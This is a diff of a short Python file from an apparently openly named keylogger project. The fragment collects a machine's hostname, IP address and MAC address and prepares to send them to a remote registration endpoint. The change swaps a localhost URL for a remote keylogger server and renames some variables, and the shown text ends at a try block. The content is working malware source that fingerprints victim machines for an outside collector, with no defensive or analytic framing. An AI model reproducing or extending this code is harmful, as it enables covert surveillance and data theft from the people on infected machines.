@@ -1,16 +1,16 @@
 import manager as keylogger
 import requests,socket
 import uuid
-url = 'http://127.0.0.1:9734/api/create_machine'
+url = 'https://keylogger.shuvax.com/api/create_machine'
 
 
 def create_logger():
-    hostname = socket.gethostname()
-    ipaddress = socket.gethostbyname(hostname)
+    host_name = socket.gethostname()
+    ip_address = socket.gethostbyname(host_name)
     mac_address = hex(uuid.getnode())
     data = {
-        "host name": hostname,
-        "ip": ipaddress,
+        "host name": host_name,
+        "ip": ip_address,
         "mac address": mac_address
     }
     try:
